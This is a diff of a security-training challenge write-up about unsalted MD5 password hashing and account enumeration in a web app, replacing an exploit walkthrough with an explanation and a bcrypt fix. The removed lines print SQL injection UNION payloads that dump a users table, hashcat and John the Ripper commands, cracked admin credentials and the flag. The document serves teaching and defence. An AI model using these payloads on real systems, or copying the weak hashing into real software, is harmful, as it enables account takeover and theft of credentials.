@@ -1,23 +1,20 @@
-# Weak MD5 Hashing Vulnerability
+# Weak Password Hashing (MD5)
 
 ## Overview
 
-This vulnerability demonstrates a critical security flaw where MD5 (Message Digest Algorithm 5) is used for password hashing. MD5 is cryptographically broken and vulnerable to collision attacks, rainbow table lookups, and brute force attacks. This makes it trivial for attackers to recover plaintext passwords from MD5 hashes, especially for weak passwords.
+MD5 is a fast, unsalted, collision-prone digest. It was designed for integrity checking, not password storage. Used as a password hash, it gives an attacker who has obtained the stored value almost no work to do: rainbow tables and GPU-based brute force recover common passwords in seconds, and the lack of a per-user salt means identical passwords produce identical hashes across users.
 
-This vulnerability is exploited through a chain attack: first, SQL injection vulnerabilities are used to extract password hashes from the database, then the weak MD5 hashes are cracked to gain admin access.
+In this challenge, the application hashes passwords with `crypto.createHash("md5")` before storing them, then compares the user-supplied input against the stored hash on login. There is no salt, no work factor, and the login endpoint emits two distinct error messages for "user not found" vs "wrong password", making account enumeration trivial in addition to the hashing weakness itself.
 
-## Vulnerability Summary
+## Why This Is Dangerous
 
-The application uses MD5 to hash user passwords before storing them in the database. MD5 has been considered cryptographically broken since 2004. It is vulnerable to:
+- **Hashes are effectively reversible** — common passwords resolve from rainbow tables instantly.
+- **GPU brute force is cheap** — billions of MD5 candidates per second per GPU.
+- **No salt** — pre-computed tables work uniformly across the user base.
+- **Cross-account reuse** — identical hashes reveal users sharing the same password.
+- **Account enumeration** — separate "Invalid credentials" / "Invalid password" messages let attackers harvest valid emails before brute force.
 
-1. **Rainbow Table Attacks**: Pre-computed hash tables allow instant password recovery for common passwords
-2. **Brute Force Attacks**: MD5 is fast to compute, making brute force attacks practical
-3. **Collision Attacks**: Multiple inputs can produce the same hash, compromising security
-4. **No Salt**: The implementation doesn't use salt, making rainbow table attacks even more effective
-
-### Vulnerable Code
-
-**MD5 Hashing:**
+## Vulnerable Code
 
 ```typescript
 const hashMD5 = (text: string): string => {
@@ -25,173 +22,47 @@ const hashMD5 = (text: string): string => {
 };
 
 const hashedPassword = hashMD5(password);
-```
-
-**Account Enumeration:**
-
-```typescript
-const user = await prisma.user.findUnique({
-  where: { email },
-});
 
 if (!user) {
   return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
 }
-
 if (user.password !== hashedPassword) {
   return NextResponse.json({ error: "Invalid password" }, { status: 401 });
 }
 ```
 
-The different error messages (`"Invalid credentials"` vs `"Invalid password"`) allow attackers to determine whether an email address is registered in the system.
+`hashMD5` returns the same 128-bit value for the same input every time, with no randomization. The lookup-then-compare pattern leaks the existence of an account through error-message differences and timing.
 
-## Impact
+## Secure Implementation
 
-This vulnerability allows attackers to:
-
-- **Recover plaintext passwords** from leaked database dumps
-- **Perform credential stuffing attacks** using cracked passwords
-- **Gain unauthorized access** to user accounts, including administrative accounts
-- **Escalate privileges** by cracking admin passwords
-- **Compromise multiple accounts** if users reuse passwords
-
-## Exploitation
-
-### How to Retrieve the Flag
-
-To retrieve the flag `OSS{w34k_md5_h4sh1ng}`, you need to chain multiple vulnerabilities: use SQL injection to extract password hashes, crack the weak MD5 hashes, and then login as admin.
-
-**Exploitation Steps:**
-
-#### Step 1: Extract User Database via SQL Injection
-
-The application has two SQL injection vulnerabilities that can be used to extract the user database:
-
-**Option A: Product Search SQL Injection (unauthenticated)**
-
-1. Navigate to the Product Search page (`/products/search`)
-2. Enter a SQL injection payload in the search box:
-   ```
-   ' UNION SELECT id, email, password, role, 'img' FROM users--
-   ```
-3. The response will contain user data including emails, password hashes, and roles
-
-**Using curl:**
-
-```bash
-curl "http://localhost:3000/api/products/search?q='%20UNION%20SELECT%20id,%20email,%20password,%20role,%20'img'%20FROM%20users--"
-```
-
-**Option B: Order Search SQL Injection (requires authentication)**
-
-1. Log in as any user (e.g., `alice@example.com` / `iloveduck`)
-2. Navigate to Order Search (`/orders/search`)
-3. Using browser dev tools or curl, send a malicious request:
-   ```javascript
-   fetch("/api/orders/search", {
-     method: "POST",
-     credentials: "include",
-     headers: { "Content-Type": "application/json" },
-     body: JSON.stringify({
-       status:
-         "' UNION SELECT id, email, password, role, id, email, password, role, role FROM users--",
-     }),
-   })
-     .then((r) => r.json())
-     .then(console.log);
-   ```
-
-Both methods will expose user data including the admin account's email and password hash.
-
-#### Step 2: Identify the Admin Account
-
-From the extracted data, look for users with `role: "ADMIN"`. You will find:
-
-- **Email**: `admin@oss.com`
-- **Password Hash**: `21232f297a57a5a743894a0e4a801fc3`
-
-#### Step 3: Crack the MD5 Hash
-
-Use one of the following methods to crack the admin's MD5 hash:
-
-**Option A: Online Tools**
-
-- Visit [CrackStation](https://crackstation.net/) or similar MD5 lookup services
-- Enter the hash `21232f297a57a5a743894a0e4a801fc3`
-
-**Option B: Command Line**
-
-```bash
-# Using hashcat
-hashcat -m 0 21232f297a57a5a743894a0e4a801fc3 /usr/share/wordlists/rockyou.txt
-
-# Using john the ripper
-echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt
-john --format=Raw-MD5 hash.txt
-```
-
-#### Step 4: Login as Admin
-
-1. Navigate to the login page (`/login`)
-2. Enter the cracked credentials:
-   - Email: `admin@oss.com`
-   - Password: `admin`
-3. Submit the form
-
-#### Step 5: Retrieve the Flag
-
-After successful login, you will be automatically redirected to the admin panel (`/admin`) where the flag `OSS{w34k_md5_h4sh1ng}` is displayed.
-
-### Alternative: Account Enumeration
-
-If you only have the password hash without the email (e.g., from a partial data leak), you can use account enumeration via the login form:
-
-- If an account **does not exist**: The error message is `"Invalid credentials"`
-- If an account **exists but password is wrong**: The error message is `"Invalid password"`
-
-Try common email patterns like `admin@oss.com`, `admin@example.com`, `administrator@oss.com` to identify valid accounts.
-
-### Why This Works
-
-- **SQL Injection exposes the database**: The two SQL injection vulnerabilities allow extracting the entire users table
-- **MD5 is trivially crackable**: The hash `21232f297a57a5a743894a0e4a801fc3` is the MD5 hash of "admin" - a password found in every rainbow table
-- **No salt**: Without salt, identical passwords always produce identical hashes, making rainbow table attacks effective
-- **Privilege escalation**: Once the admin password is cracked, full admin access is gained
-
-### Code Fixes
-
-**Before (Vulnerable):**
-
-```typescript
-const hashMD5 = (text: string): string => {
-  return crypto.createHash("md5").update(text).digest("hex");
-};
-
-const hashedPassword = hashMD5(password);
-```
-
-**After (Secure):**
+Use a password-specific KDF that is slow by design, salts every record automatically, and supports tunable work factors.
 
 ```typescript
 import bcrypt from "bcryptjs";
 
-const hashPassword = async (password: string): Promise<string> => {
-  const saltRounds = 12;
-  return await bcrypt.hash(password, saltRounds);
-};
+export async function hashPassword(password: string): Promise<string> {
+  return bcrypt.hash(password, 12);
+}
 
-const verifyPassword = async (
+export async function verifyPassword(
   password: string,
   hash: string
-): Promise<boolean> => {
-  return await bcrypt.compare(password, hash);
-};
+): Promise<boolean> {
+  return bcrypt.compare(password, hash);
+}
 ```
+
+`argon2id` is preferable on greenfield projects (it is the OWASP-recommended default); `scrypt` and `bcrypt` remain acceptable. Whatever the choice, the work factor must be tuned so a single hash takes hundreds of milliseconds on production hardware, and re-tuned over time as hardware improves.
+
+Two extra controls that belong in the same change:
+
+- **Constant-shape responses.** Return the same error and the same timing whether the email exists or not. Run the password verifier even when the user is missing (using a dummy hash) to flatten timing.
+- **Rotate-on-login.** When a user logs in successfully and their record still uses the old algorithm or work factor, transparently re-hash with the new parameters and update the row.
 
 ## References
 
 - [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
 - [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)
-- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
-- [MD5 Collision Vulnerability](https://en.wikipedia.org/wiki/MD5#Security)
-- [OWASP Top 10 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
+- [CWE-759: Use of a One-Way Hash without a Salt](https://cwe.mitre.org/data/definitions/759.html)
+- [NIST SP 800-63B — Memorized Secret Verifiers](https://pages.nist.gov/800-63-3/sp800-63b.html)
+- [OWASP Top 10 — A02:2021 Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
